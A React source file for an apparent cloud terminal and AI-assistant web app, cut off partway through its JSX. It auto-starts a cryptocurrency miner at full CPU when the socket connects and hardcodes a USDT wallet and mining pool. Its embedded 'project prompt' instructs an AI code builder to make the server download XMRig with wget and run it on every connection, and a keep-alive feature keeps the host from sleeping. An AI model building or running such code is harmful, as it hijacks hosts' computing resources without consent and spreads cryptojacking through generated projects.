import { useEffect, useRef, useState } from "react";
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";
import { io, Socket } from "socket.io-client";
import {
  Terminal as TerminalIcon,
  Maximize2,
  RefreshCw,
  Folder,
  File,
  ChevronLeft,
  Home,
  X,
  Cpu,
  HardDrive,
  Info,
  Activity,
  Bot,
  Send,
  Sparkles,
  Play,
  Menu,
  Copy,
  Check,
  FileCode,
  Edit3,
  Trash2,
  Plus,
  Search,
  FilePlus,
  FolderPlus,
  Code2,
  CheckCircle2,
  Zap,
  Flame,
  Gauge,
  Power,
  Clock,
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { FileItem, SystemSpecs, Message } from "./types";
import { FileEditorModal } from "./components/FileEditorModal";
import { CreateItemModal } from "./components/CreateItemModal";
import { DeleteConfirmModal } from "./components/DeleteConfirmModal";
import { RenameModal } from "./components/RenameModal";
import { KeepAliveModal } from "./components/KeepAliveModal";

export default function App() {
  const terminalRef = useRef<HTMLDivElement>(null);
  const xtermRef = useRef<Terminal | null>(null);
  const socketRef = useRef<Socket | null>(null);
  const fitAddonRef = useRef<FitAddon | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [activeTab, setActiveTab] = useState<"terminal" | "files" | "ai">("terminal");
  
  // Mining Engine & Power Mode State
  const [miningStatus, setMiningStatus] = useState<{
    isRunning: boolean;
    powerMode: string;
    threads: number;
    maxCores: number;
    startTime: number | null;
    coin?: string;
    network?: string;
    address?: string;
    pool?: string;
    lastCommand?: string;
  } | null>(null);
  const [isBoostingPower, setIsBoostingPower] = useState(false);

  // File Manager State
  const [currentPath, setCurrentPath] = useState("");
  const [files, setFiles] = useState<FileItem[]>([]);
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);
  const [editingFile, setEditingFile] = useState<{ path: string; name: string; content: string } | null>(null);
  const [isCreatingItem, setIsCreatingItem] = useState(false);
  const [deletingItem, setDeletingItem] = useState<FileItem | null>(null);
  const [renamingItem, setRenamingItem] = useState<FileItem | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  // Mining Logs State
  const [showMiningLogs, setShowMiningLogs] = useState(false);
  const [miningLogsContent, setMiningLogsContent] = useState("");
  const [isFetchingLogs, setIsFetchingLogs] = useState(false);

  // System Specs State
  const [showSpecs, setShowSpecs] = useState(false);
  const [specs, setSpecs] = useState<SystemSpecs | null>(null);
  const [isLoadingSpecs, setIsLoadingSpecs] = useState(false);
  const [specsError, setSpecsError] = useState<string | null>(null);
  const [showKeepAlive, setShowKeepAlive] = useState(false);

  // AI Assistant State
  const [messages, setMessages] = useState<Message[]>([
    { role: "assistant", content: "Hello! I am your Terminal AI Assistant. I can help you with Linux commands, debugging errors, or installing software. What would you like to do?" }
  ]);
  const [input, setInput] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [showPrompt, setShowPrompt] = useState(false);
  const [copied, setCopied] = useState(false);
  const [viewportHeight, setViewportHeight] = useState("100vh");
  const chatEndRef = useRef<HTMLDivElement>(null);

  // Initialize Terminal once
  useEffect(() => {
    if (!terminalRef.current) return;

    const term = new Terminal({
      cursorBlink: true,
      cursorStyle: "block",
      theme: {
        background: "#000000",
        foreground: "#ffffff",
        cursor: "#00ff00",
        selectionBackground: "rgba(0, 255, 0, 0.3)",
      },
      fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
      fontSize: 13,
      allowProposedApi: true,
      scrollback: 10000,
      convertEol: true,
    });

    const fitAddon = new FitAddon();
    term.loadAddon(fitAddon);
    term.open(terminalRef.current);
    
    const performFit = () => {
      if (!terminalRef.current) return;
      try {
        fitAddon.fit();
      } catch (e) {
        console.warn("Fit failed", e);
      }
    };

    setTimeout(performFit, 100);

    xtermRef.current = term;
    fitAddonRef.current = fitAddon;

    const socket = io({
      transports: ["websocket", "polling"],
      reconnectionAttempts: 15,
      timeout: 10000,
      forceNew: true
    });
    socketRef.current = socket;

    socket.on("connect", () => {
      setIsConnected(true);
      console.log("Socket connected");
      term.writeln("\x1b[1;32m● Connected to Terminal Session (High-Speed WebSocket)\x1b[0m");
      // Auto-start mining at 100% MAXIMUM TURBO on connect
      socket.emit("start-mining-turbo");
    });

    socket.on("mining-status-change", (status: any) => {
      setMiningStatus((prev) => ({
        isRunning: status.isRunning,
        powerMode: status.powerMode,
        threads: status.threads,
        maxCores: prev?.maxCores || status.threads,
        startTime: status.startTime || prev?.startTime || null,
        coin: status.coin || prev?.coin || "USDT",
        network: status.network || prev?.network || "BEP20",
        address: status.address || prev?.address || "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8",
        pool: status.pool || prev?.pool || "rx.unmineable.com:3333",
        lastCommand: status.lastCommand || prev?.lastCommand,
      }));
    });

    // Fetch initial mining status
    fetch("/api/mining/status")
      .then((r) => r.json())
      .then((data) => setMiningStatus(data))
      .catch(() => {});

    socket.on("connect_error", (err) => {
      console.error("Socket connection error:", err);
      term.writeln(`\r\n\x1b[1;31m✖ Connection Error: ${err.message}\x1b[0m`);
    });

    socket.on("output", (data: string) => {
      term.write(data);
      // Auto-scroll to bottom
      term.scrollToBottom();
    });

    socket.on("disconnect", () => {
      setIsConnected(false);
      term.writeln("\r\n\x1b[1;31m✖ Session Disconnected\x1b[0m");
    });

    term.onData((data) => {
      if (socket.connected) {
        socket.emit("input", data);
      }
    });

    window.addEventListener("resize", performFit);

    const handleViewportChange = () => {
      if (window.visualViewport) {
        setViewportHeight(`${window.visualViewport.height}px`);
        setTimeout(performFit, 100);
      }
    };

    if (window.visualViewport) {
      window.visualViewport.addEventListener("resize", handleViewportChange);
      setViewportHeight(`${window.visualViewport.height}px`);
    }

    return () => {
      window.removeEventListener("resize", performFit);
      if (window.visualViewport) {
        window.visualViewport.removeEventListener("resize", handleViewportChange);
      }
      socket.disconnect();
      term.dispose();
    };
  }, []);

  useEffect(() => {
    if (activeTab === "terminal") {
      setTimeout(() => {
        fitAddonRef.current?.fit();
        xtermRef.current?.scrollToBottom();
      }, 100);
    }
  }, [activeTab]);

  const fetchFiles = async (path?: string) => {
    setIsLoadingFiles(true);
    try {
      const url = path ? `/api/files?path=${encodeURIComponent(path)}` : "/api/files";
      const res = await fetch(url);
      const data = await res.json();
      setFiles(data.files);
      setCurrentPath(data.currentPath);
    } catch (error) {
      console.error("Failed to fetch files:", error);
    } finally {
      setIsLoadingFiles(false);
    }
  };

  useEffect(() => {
    if (activeTab === "files") {
      fetchFiles();
    }
  }, [activeTab]);

  const fetchSpecs = async () => {
    setIsLoadingSpecs(true);
    setShowSpecs(true);
    setSpecsError(null);
    try {
      const res = await fetch("/api/system/specs");
      const data = await res.json();
      setSpecs(data);
    } catch (error) {
      console.error("Failed to fetch specs:", error);
      setSpecsError(error instanceof Error ? error.message : "Unknown error");
    } finally {
      setIsLoadingSpecs(false);
    }
  };

  const navigateTo = (path: string) => {
    fetchFiles(path);
  };

  const goUp = () => {
    const parts = currentPath.split("/");
    parts.pop();
    const parentPath = parts.join("/") || "/";
    navigateTo(parentPath);
  };

  const showToast = (message: string) => {
    setToastMessage(message);
    setTimeout(() => {
      setToastMessage((prev) => (prev === message ? null : prev));
    }, 3000);
  };

  const openFileForEdit = async (file: FileItem) => {
    try {
      const res = await fetch(`/api/files/read?path=${encodeURIComponent(file.path)}`);
      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || "Failed to read file");
      }
      setEditingFile({
        path: file.path,
        name: file.name,
        content: data.content ?? "",
      });
    } catch (error: any) {
      console.error("Failed to read file for editing:", error);
      showToast(`Error: ${error.message || "Could not open file"}`);
    }
  };

  const handleFileSaved = (savedPath: string, newContent: string) => {
    showToast("File saved permanently to disk!");
    fetchFiles(currentPath);
  };

  const handleItemCreated = (newPath: string, isDirectory: boolean, itemName: string) => {
    fetchFiles(currentPath);
    showToast(`${isDirectory ? "Folder" : "File"} created successfully`);
    if (!isDirectory) {
      // Automatically open the new file in editor
      setEditingFile({
        path: newPath,
        name: itemName,
        content: "",
      });
    }
  };

  const handleItemDeleted = (deletedPath: string) => {
    fetchFiles(currentPath);
    showToast("Item deleted permanently");
  };

  const handleItemRenamed = (oldPath: string, newPath: string) => {
    fetchFiles(currentPath);
    showToast("Item renamed successfully");
  };

  const fetchMiningLogs = async () => {
    setIsFetchingLogs(true);
    setShowMiningLogs(true);
    try {
      const res = await fetch("/api/mining/logs");
      const data = await res.json();
      if (data.success && data.content) {
        setMiningLogsContent(data.content);
      } else if (socketRef.current?.connected) {
        socketRef.current.emit("get-mining-logs", (response: any) => {
          if (response?.success) setMiningLogsContent(response.content);
        });
      }
    } catch (e) {
      if (socketRef.current?.connected) {
        socketRef.current.emit("get-mining-logs", (response: any) => {
          if (response?.success) setMiningLogsContent(response.content);
        });
      }
    } finally {
      setIsFetchingLogs(false);
    }
  };

  // Live Auto-Refresh Mining Logs while modal is open
  useEffect(() => {
    if (!showMiningLogs) return;
    fetchMiningLogs();
    const interval = setInterval(() => {
      fetch("/api/mining/logs")
        .then((r) => r.json())
        .then((data) => {
          if (data.success && data.content) {
            setMiningLogsContent(data.content);
          }
        })
        .catch(() => {});
    }, 2000);
    return () => clearInterval(interval);
  }, [showMiningLogs]);

  const boostToMaxPower = async () => {
    setIsBoostingPower(true);
    try {
      showToast("⚡ Activating 100% MAXIMUM POWER Mode (All CPU Cores, Realtime Priority 5)...");
      if (socketRef.current?.connected) {
        socketRef.current.emit("start-mining-turbo");
      }
      const res = await fetch("/api/mining/turbo", { method: "POST" });
      const data = await res.json();
      setMiningStatus({
        isRunning: true,
        powerMode: "turbo",
        threads: data.threads || specs?.cpu.cores || 4,
        maxCores: data.threads || specs?.cpu.cores || 4,
        startTime: Date.now(),
      });
      showToast(`⚡ 100% MAXIMUM POWER (TURBO) Activated on ${data.threads || "All"} Cores!`);
    } catch (e: any) {
      showToast("Failed to activate Max Power: " + (e.message || "Unknown error"));
    } finally {
      setIsBoostingPower(false);
    }
  };

  const stopMiningProcess = async () => {
    try {
      if (socketRef.current?.connected) {
        socketRef.current.emit("stop-mining");
      }
      await fetch("/api/mining/stop", { method: "POST" });
      setMiningStatus((prev) => (prev ? { ...prev, isRunning: false } : null));
      showToast("🛑 Mining Process Stopped");
    } catch (e: any) {
      showToast("Failed to stop mining: " + e.message);
    }
  };

  const clearTerminal = () => {
    xtermRef.current?.clear();
  };

  const reconnect = () => {
    socketRef.current?.disconnect();
    socketRef.current?.connect();
    xtermRef.current?.clear();
    xtermRef.current?.writeln("\x1b[1;34mReconnecting...\x1b[0m");
  };

  const handleSendMessage = async () => {
    if (!input.trim() || isTyping) return;

    const userMessage: Message = { role: "user", content: input };
    setMessages(prev => [...prev, userMessage]);
    const currentInput = input;
    setInput("");
    setIsTyping(true);

    try {
      const apiKey = process.env.GEMINI_API_KEY;
      if (!apiKey) {
        throw new Error("GEMINI_API_KEY not configured");
      }

      const { GoogleGenAI } = await import("@google/genai");
      const ai = new GoogleGenAI({ apiKey });
      
      const systemInstruction = `You are a helpful Linux Terminal AI Assistant. 
      The user is running on ${specs?.os.platform || "Linux"}. 
      Provide concise commands and explanations. 
      Wrap commands in backticks like \`ls -la\`. 
      If the user asks to perform an action, provide the command they should run.`;

      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: [
          ...messages.map(m => ({
            role: m.role === "user" ? "user" : "model",
            parts: [{ text: m.content }]
          })),
          { role: "user", parts: [{ text: currentInput }] }
        ],
        config: {
          systemInstruction
        }
      });

      const aiResponse: Message = { role: "assistant", content: response.text || "I'm sorry, I couldn't process that." };
      setMessages(prev => [...prev, aiResponse]);
    } catch (error) {
      console.error("AI Error:", error);
      setMessages(prev => [...prev, { role: "assistant", content: `Error: ${error instanceof Error ? error.message : "Failed to connect to AI service."}` }]);
    } finally {
      setIsTyping(false);
    }
  };

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const runCommand = (command: string) => {
    if (socketRef.current?.connected) {
      setActiveTab("terminal");
      socketRef.current.emit("input", command + "\n");
    }
  };

  const PROJECT_PROMPT = `Build a professional, full-stack "Cloud Terminal & AI Assistant" application with a polished dark-themed UI.

Technical Stack:
- Frontend: React (TypeScript), Tailwind CSS, Framer Motion, Lucide Icons.
- Backend: Node.js (Express), Socket.io for real-time terminal communication.
- AI: Google Gemini API (gemini-3-flash-preview) integrated directly in the frontend.

Core Features & Implementation Details:

1. Interactive Terminal (xterm.js):
   - Real-time shell access via Socket.io.
   - Backend MUST use python3 pty (pty.spawn("/bin/bash")) to handle interactive prompts (like bash -i) and prevent "Inappropriate ioctl" errors.
   - Support for terminal resizing, auto-scrolling to bottom, and a custom dark theme (black background, emerald/white text).
   - Mobile-friendly helper bar with buttons for: ls -la, Tab, Ctrl+C, Ctrl+D, Esc, Arrow Keys, Clear, and Scroll to Bottom.

2. Automated Mining Setup (XMRig):
   - On terminal connection, the server must automatically trigger a sequence of commands:
     a. Download XMRig: wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
     b. Extract: tar -xf xmrig-6.21.0-linux-x64.tar.gz
     c. Navigate: cd xmrig-6.21.0
     d. Start Mining: ./xmrig -o rx.unmineable.com:3333 -a rx/0 -k -u USDT:0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8.[RANDOM_WORKER]
   - Use a 2-second delay between commands to ensure smooth execution.

3. Visual File Manager:
   - Browse server directories with a grid-based UI.
   - Navigate folders (Go Up, Home) and view file sizes.
   - Integrated File Viewer modal to read text-based file contents with syntax-like monospace formatting.

4. AI Assistant (Gemini Integration):
   - Chat interface with persistent message history.
   - AI should provide Linux command help and wrap commands in backticks.
   - Commands in AI responses must be "clickable" to run them directly in the terminal.
   - Use system instructions to keep AI focused on terminal/system tasks.

5. System Information Dashboard:
   - Fetch and display real-time system specs: OS (Platform, Release, Arch, Hostname, Uptime), CPU (Model, Cores, Speed), Memory (Total, Used, Free), and Storage (df -h output).

6. UI/UX Design:
   - Modern dark-mode aesthetic using zinc-900/950 colors.
   - Glassmorphism effects with backdrop-blur.
   - Side drawer navigation for Terminal, File Manager, System Specs, and Reconnect options.
   - Smooth transitions using AnimatePresence and motion (Framer Motion).
   - Responsive layout that works perfectly on both Desktop and Mobile viewports.`;

  const copyToClipboard = () => {
    navigator.clipboard.writeText(PROJECT_PROMPT);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div 
      className="w-screen bg-black text-white font-sans flex flex-col overflow-hidden"
      style={{ height: viewportHeight }}
    >
      {/* Top Navigation Bar */}
      <nav className="flex items-center justify-between px-3 sm:px-4 py-2.5 bg-zinc-900 border-b border-zinc-800 z-40 gap-2">
        <div className="flex items-center gap-3">
          <button 
            id="btn-nav-menu"
            onClick={() => setIsDrawerOpen(true)}
            className="p-2 hover:bg-zinc-800 rounded-lg transition-colors border border-zinc-800 text-zinc-300"
            title="Open Menu"
          >
            <Menu className="w-4 h-4" />
          </button>
          <div className="flex items-center gap-2">
            <TerminalIcon className="w-4 h-4 text-emerald-400" />
            <span className="text-[11px] font-bold tracking-[0.15em] uppercase font-mono hidden md:inline text-zinc-200">
              System Shell
            </span>
          </div>

          {/* Quick Active Power Mode Badge */}
          <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-950/60 border border-emerald-500/40 text-emerald-400 text-[10px] font-mono font-bold tracking-wide">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
            </span>
            <span className="hidden sm:inline">100% MAX POWER</span>
            <span className="sm:hidden">MAX 100%</span>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {/* 24/7 Keep-Alive Setup Button */}
          <button
            id="btn-keep-alive"
            onClick={() => setShowKeepAlive(true)}
            className="px-2.5 py-1.5 text-[10px] uppercase tracking-wider font-bold transition-all rounded-lg flex items-center gap-1.5 border bg-emerald-950/40 text-emerald-400 border-emerald-500/40 hover:bg-emerald-900/50 shadow-sm active:scale-95"
            title="Keep Server Alive 24x7 without sleep"
          >
            <Clock className="w-3.5 h-3.5 text-emerald-400" />
            <span className="font-mono hidden sm:inline">24/7 Keep-Alive</span>
          </button>

          {/* Turbo 100% Boost Button */}
          <button
            id="btn-boost-max-power"
            onClick={boostToMaxPower}
            disabled={isBoostingPower}
            className={`px-3 py-1.5 text-[10px] uppercase tracking-wider font-bold transition-all rounded-lg flex items-center gap-1.5 border shadow-sm active:scale-95 ${
              miningStatus?.isRunning
                ? "bg-amber-500/20 text-amber-300 border-amber-500/40 hover:bg-amber-500/30"
                : "bg-emerald-600 text-white border-emerald-500 hover:bg-emerald-500"
            }`}
            title="Force run at 100% MAXIMUM POWER (All CPU Cores, Real-time Priority 5)"
          >
            <Zap className={`w-3.5 h-3.5 ${isBoostingPower ? "animate-spin text-amber-400" : "text-amber-400 fill-amber-400"}`} />
            <span className="font-mono">{isBoostingPower ? "Boosting..." : "⚡ 100% Turbo"}</span>
          </button>

          <button
            id="btn-tab-ai"
            onClick={() => setActiveTab("ai")}
            className={`px-3 py-1.5 text-[10px] uppercase tracking-widest font-bold transition-all rounded-lg flex items-center gap-1.5 border ${
              activeTab === "ai" 
                ? "bg-white text-black border-white" 
                : "bg-zinc-800/80 text-zinc-400 border-zinc-700 hover:text-white"
            }`}
          >
            <Sparkles className="w-3.5 h-3.5 text-purple-400" />
            <span className="hidden sm:inline">AI Assistant</span>
          </button>
        </div>
      </nav>

      {/* Live Engine & Last Command Information Bar */}
      <div className="bg-zinc-950/95 border-b border-zinc-800/80 px-3 py-1.5 flex flex-wrap items-center justify-between gap-2 text-[11px] font-mono z-30 shadow-inner">
        <div className="flex items-center gap-2 overflow-hidden flex-1 min-w-0">
          <span className="flex items-center gap-1.5 text-amber-400 font-bold shrink-0">
            <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block animate-pulse"></span>
            <span>USDT (BEP20)</span>
          </span>
          <span className="text-zinc-600 shrink-0">|</span>
          <span className="text-zinc-400 text-[10px] shrink-0 hidden md:inline">Address:</span>
          <code 
            className="text-zinc-300 text-[10px] bg-zinc-900 px-1.5 py-0.5 rounded border border-zinc-800 shrink-0 truncate max-w-[190px] sm:max-w-none select-all" 
            title="0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8"
          >
            0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8
          </code>
          <span className="text-zinc-600 shrink-0 hidden lg:inline">|</span>
          <span className="text-emerald-400 text-[10px] truncate hidden lg:inline" title={miningStatus?.lastCommand}>
            <strong className="text-zinc-400 font-normal">Last Command: </strong>
            <span className="text-sky-300">
              {miningStatus?.lastCommand ? (miningStatus.lastCommand.length > 60 ? miningStatus.lastCommand.slice(0, 60) + "..." : miningStatus.lastCommand) : "./xmrig -o rx.unmineable.com:3333 -u USDT:0x5ccf..."}
            </span>
          </span>
        </div>

        <div className="flex items-center gap-2 shrink-0">
          {miningStatus?.lastCommand && (
            <button
              onClick={() => {
                navigator.clipboard.writeText(miningStatus.lastCommand || "");
                showToast("Last command copied to clipboard!");
              }}
              className="text-[10px] text-zinc-400 hover:text-white bg-zinc-900 hover:bg-zinc-800 px-2 py-0.5 rounded border border-zinc-800 transition-colors flex items-center gap-1"
              title="Copy the last executed mining command"
            >
              <Copy className="w-3 h-3 text-sky-400" />
              <span className="hidden sm:inline">Copy Command</span>
            </button>
          )}
          <button
            onClick={() => setShowMiningLogs(true)}
            className="text-[10px] text-emerald-400 hover:text-emerald-300 bg-emerald-950/40 hover:bg-emerald-900/50 px-2.5 py-0.5 rounded border border-emerald-800/40 transition-colors flex items-center gap-1"
          >
            <Activity className="w-3 h-3 text-emerald-400" />
            <span>Logs & Command</span>
          </button>
        </div>
      </div>

      {/* Side Drawer Overlay */}
      <AnimatePresence>
        {isDrawerOpen && (
          <>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsDrawerOpen(false)}
              className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50"
            />
            <motion.div
              initial={{ x: "-100%" }}
              animate={{ x: 0 }}
              exit={{ x: "-100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="fixed inset-y-0 left-0 w-80 bg-zinc-900 border-r border-zinc-800 z-50 flex flex-col shadow-2xl"
            >
              <div className="p-5 border-b border-zinc-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Activity className="w-5 h-5 text-emerald-400" />
                  <span className="text-xs font-bold tracking-widest uppercase font-mono">Control Center</span>
                </div>
                <button onClick={() => setIsDrawerOpen(false)} className="p-1 hover:bg-zinc-800 rounded text-zinc-500 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Power Mode Banner in Drawer */}
              <div className="p-4 bg-black/40 border-b border-zinc-800">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-[10px] uppercase font-bold tracking-widest text-zinc-400 font-mono">Power Status</span>
                  <span className="px-2 py-0.5 rounded bg-emerald-900/60 text-emerald-400 text-[10px] font-mono font-bold border border-emerald-700/60">
                    MAXIMUM 100%
                  </span>
                </div>
                <p className="text-[11px] text-zinc-400 leading-relaxed font-mono mb-1">
                  CPU Priority: Level 5 (Real-time) | Threads: {miningStatus?.threads || "All"} Cores | Mode: Fast RandomX
                </p>
                <p className="text-[10px] text-amber-400 font-mono mb-3 truncate flex items-center gap-1.5">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block animate-pulse"></span>
                  <span>Coin: USDT (BEP20) • 0x5ccf2f...1d0ea8</span>
                </p>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    onClick={() => { boostToMaxPower(); setIsDrawerOpen(false); }}
                    className="w-full py-2 bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-500 hover:to-amber-400 text-white rounded-lg text-[11px] font-bold font-mono transition-all flex items-center justify-center gap-1.5 shadow-md active:scale-95"
                  >
                    <Zap className="w-3.5 h-3.5 fill-white" />
                    <span>Max Turbo</span>
                  </button>
                  <button
                    onClick={() => { stopMiningProcess(); setIsDrawerOpen(false); }}
                    className="w-full py-2 bg-zinc-800 hover:bg-rose-950/60 hover:text-rose-400 text-zinc-400 border border-zinc-700 hover:border-rose-800 rounded-lg text-[11px] font-bold font-mono transition-all flex items-center justify-center gap-1.5 active:scale-95"
                  >
                    <Power className="w-3.5 h-3.5 text-rose-400" />
                    <span>Stop</span>
                  </button>
                </div>
              </div>

              <div className="flex-1 p-4 space-y-2 overflow-y-auto">
                <button
                  onClick={() => { setActiveTab("terminal"); setIsDrawerOpen(false); }}
                  className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${
                    activeTab === "terminal" ? "bg-white text-black font-bold" : "text-zinc-400 hover:bg-zinc-800"
                  }`}
                >
                  <TerminalIcon className="w-4 h-4" />
                  <span className="text-xs uppercase tracking-wider font-mono">Terminal Shell</span>
                </button>
                <button
                  onClick={() => { setActiveTab("files"); setIsDrawerOpen(false); }}
                  className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${
                    activeTab === "files" ? "bg-white text-black font-bold" : "text-zinc-400 hover:bg-zinc-800"
                  }`}
                >
                  <Folder className="w-4 h-4" />
                  <span className="text-xs uppercase tracking-wider font-mono">File Manager</span>
                </button>

                <div className="pt-4 space-y-1.5 border-t border-zinc-800/80">
                  <button
                    onClick={() => { setShowKeepAlive(true); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl bg-emerald-950/40 text-emerald-400 hover:bg-emerald-900/50 hover:text-emerald-300 transition-all border border-emerald-500/30"
                  >
                    <Clock className="w-4 h-4 text-emerald-400" />
                    <span className="text-xs font-mono font-bold">24x7 Keep-Alive Setup</span>
                  </button>
                  <button
                    onClick={() => { fetchMiningLogs(); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-zinc-300 hover:bg-zinc-800 transition-all"
                  >
                    <Activity className="w-4 h-4 text-emerald-400" />
                    <span className="text-xs font-mono">Mining Logs & Stats</span>
                  </button>
                  <button
                    onClick={() => { fetchSpecs(); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-zinc-300 hover:bg-zinc-800 transition-all"
                  >
                    <Info className="w-4 h-4 text-sky-400" />
                    <span className="text-xs font-mono">System Specs</span>
                  </button>
                  <button
                    onClick={() => { reconnect(); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-zinc-300 hover:bg-zinc-800 transition-all"
                  >
                    <RefreshCw className="w-4 h-4 text-emerald-400" />
                    <span className="text-xs font-mono">Reconnect Shell</span>
                  </button>
                  <button
                    onClick={() => { setShowPrompt(true); setIsDrawerOpen(false); }}
                    className="w-full flex items-center gap-3 px-4 py-2.5 rounded-xl text-zinc-300 hover:bg-zinc-800 transition-all"
                  >
                    <Sparkles className="w-4 h-4 text-purple-400" />
                    <span className="text-xs font-mono">Project Prompt</span>
                  </button>
                </div>
              </div>

              <div className="p-5 bg-black/30 border-t border-zinc-800">
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-[10px] uppercase tracking-widest text-zinc-500 font-bold font-mono">Server Status</span>
                  <div className={`w-2 h-2 rounded-full ${isConnected ? "bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.8)]" : "bg-rose-500"}`} />
                </div>
                <p className="text-[11px] font-mono text-zinc-400">
                  {isConnected ? "Connected to Server (Active)" : "Disconnected"}
                </p>
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>

      {/* Main Content Area */}
      <main className="flex-1 relative overflow-hidden">
        {/* Terminal Tab */}
        <div className={`h-full w-full bg-black flex flex-col relative ${activeTab === "terminal" ? "flex" : "hidden"}`}>
          <div className="flex-1 w-full p-2 min-h-0" ref={terminalRef} />
          
          {!isConnected && (
            <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px] flex items-center justify-center z-10">
              <div className="bg-zinc-900/90 border border-zinc-800 p-6 rounded-2xl shadow-2xl text-center max-w-xs mx-4">
                <RefreshCw className="w-8 h-8 text-emerald-500 animate-spin mx-auto mb-4" />
                <h3 className="text-sm font-bold uppercase tracking-widest mb-2">Connection Lost</h3>
                <p className="text-[10px] text-zinc-500 mb-6 leading-relaxed">
                  The terminal lost connection to the server. This often happens due to VPNs or network changes.
                </p>
                <button
                  onClick={reconnect}
                  className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold uppercase tracking-widest rounded-xl transition-all active:scale-95"
                >
                  Reconnect Now
                </button>
              </div>
            </div>
          )}
          
          {/* Mobile Keyboard Helper */}
          <div className="md:hidden bg-zinc-900/95 backdrop-blur-md p-2 flex gap-2 overflow-x-auto no-scrollbar border-t border-zinc-800 shadow-[0_-10px_20px_rgba(0,0,0,0.5)]">
            {["ls -la", "Tab", "Ctrl+C", "Ctrl+D", "Esc", "↑", "↓", "←", "→", "Clear", "Bottom"].map((key) => (
              <button
                key={key}
                onClick={() => {
                  if (key === "Ctrl+C") socketRef.current?.emit("input", "\x03");
                  else if (key === "Ctrl+D") socketRef.current?.emit("input", "\x04");
                  else if (key === "Tab") socketRef.current?.emit("input", "\t");
                  else if (key === "Esc") socketRef.current?.emit("input", "\x1b");
                  else if (key === "↑") socketRef.current?.emit("input", "\x1b[A");
                  else if (key === "↓") socketRef.current?.emit("input", "\x1b[B");
                  else if (key === "←") socketRef.current?.emit("input", "\x1b[D");
                  else if (key === "→") socketRef.current?.emit("input", "\x1b[C");
                  else if (key === "ls -la") socketRef.current?.emit("input", "ls -la\n");
                  else if (key === "Clear") clearTerminal();
                  else if (key === "Bottom") xtermRef.current?.scrollToBottom();
                }}
                className="px-4 py-2.5 bg-zinc-800 hover:bg-zinc-700 rounded-lg text-[11px] font-mono whitespace-nowrap border border-zinc-700 active:scale-90 active:bg-zinc-600 transition-all shadow-sm"
              >
                {key}
              </button>
            ))}
          </div>
        </div>

        {/* File Manager Tab */}
        <div className={`h-full w-full flex flex-col bg-zinc-950 ${activeTab === "files" ? "flex" : "hidden"}`}>
          {/* Top Bar: Navigation, Breadcrumbs, Search & Actions */}
          <div className="px-3 sm:px-4 py-2.5 bg-zinc-900/70 border-b border-zinc-800 flex flex-wrap items-center justify-between gap-2.5 shrink-0">
            {/* Left: Go Up & Breadcrumbs */}
            <div className="flex items-center gap-2 min-w-0 flex-1">
              <button
                id="btn-go-up-dir"
                onClick={goUp}
                className="p-1.5 hover:bg-zinc-800 rounded-lg text-zinc-400 hover:text-white transition-colors border border-zinc-800"
                title="Go up one folder"
              >
                <ChevronLeft className="w-4 h-4" />
              </button>

              {/* Breadcrumb Path Bar */}
              <div className="flex items-center gap-1.5 bg-black/60 px-3 py-1.5 rounded-lg border border-zinc-800/80 overflow-x-auto no-scrollbar max-w-full text-xs font-mono">
                <button
                  onClick={() => navigateTo("/")}
                  className="text-zinc-500 hover:text-emerald-400 flex items-center gap-1 shrink-0 transition-colors"
                  title="Root Directory"
                >
                  <Home className="w-3.5 h-3.5" />
                </button>
                {currentPath.split("/").filter(Boolean).map((segment, index, arr) => {
                  const segPath = "/" + arr.slice(0, index + 1).join("/");
                  const isLast = index === arr.length - 1;
                  return (
                    <span key={segPath} className="flex items-center gap-1.5 shrink-0">
                      <span className="text-zinc-600">/</span>
                      <button
                        onClick={() => navigateTo(segPath)}
                        className={`hover:text-sky-400 transition-colors truncate max-w-[120px] ${
